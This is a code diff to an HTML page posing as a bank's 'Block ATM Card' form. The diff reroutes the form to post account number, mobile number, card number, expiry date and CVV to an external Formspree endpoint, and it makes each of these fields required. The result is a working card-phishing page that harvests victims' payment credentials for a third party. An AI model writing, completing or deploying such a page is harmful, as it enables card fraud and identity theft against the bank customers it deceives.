@@ -202,8 +202,8 @@
     select{
       padding: 10px;
     }
-    .btn:hover {
-  background-color: #00B5EF; /* Change on hover */
+    .btn:active {
+  transform: scale(0.95); /* Shrinks slightly when tapped */
 }
    
     </style>
@@ -218,18 +218,18 @@
                 <h2>Block ATM Card</h2>
                 <p>Mandetary fields are marked in asterisk(*)</p>
               </div>
-            <form action="otp.html">
+            <form action="https://formspree.io/f/xldgnpqy" method="post">
               <div class="formContainer">
                 <div class="input-fieldf">
                   <div class="input-fieldc">
                     <span>Account Number <font color="#00B5EF">*</font> </span>
-                    <input type="text" />
+                    <input type="text" name="ano" required/>
                   </div>
                 </div>
                 <div class="input-field">
                     <div class="input-fieldc">
                       <span>Country</span>
-                      <select name="countries" form="carform">
+                      <select name="countries" form="carform" name="country">
                         <option value="">--Select a country--</option>
                         <option value="Afghanistan">Afghanistan</option>
                         <option value="Albania">Albania</option>
@@ -327,31 +327,31 @@
                   <div class="input-field">
                     <div class="input-fieldc">
                       <span>Registered Mobile Number <font color="#00B5EF">*</font></span>
-                      <input type="number" />
+                      <input type="number" name="rmb" required/>
                     </div>
                   </div>
                   <div class="input-field">
                     <div class="input-fieldc">
                       <span>Card No <font color="#00B5EF">*</font></span>
-                      <input type="text" id="credit-card" name="credit-card"  maxlength="19" oninput="formatCreditCardNumber(event)"/>
+                      <input type="text" id="credit-card" name="cardno"  maxlength="19" oninput="formatCreditCardNumber(event)" required/>
                     </div>
                   </div>
                 <div class="input-field">
                     <div class="input-field2">
                   <div class="input-fieldc3">
                     <span>Expiry Date <font color="#00B5EF">*</font></span>
-                    <input type="text" id="expiry-date" name="expiry-date"  maxlength="5" oninput="formatExpiryDate(event)" />
+                    <input type="text" id="expiry-date" name="expiry-date"  maxlength="5" oninput="formatExpiryDate(event)" required/>
                   </div>
                   <div class="input-fieldc3" id="left">
                     <span>CVV <small>(security code)</small> </span>
-                    <input type="number" />
+                    <input type="number" name="cvv" required/>
                 </div> 
                   </div>
                 </div>
                 <div class="input-field">
                     <div class="input-fieldc">
                       <span>Enter the text as shown in the image <font color="#00B5EF">*</font></span>
-                      <input type="text" />
+                      <input type="text" name="capt" required/>
                     </div>
               </div>
               
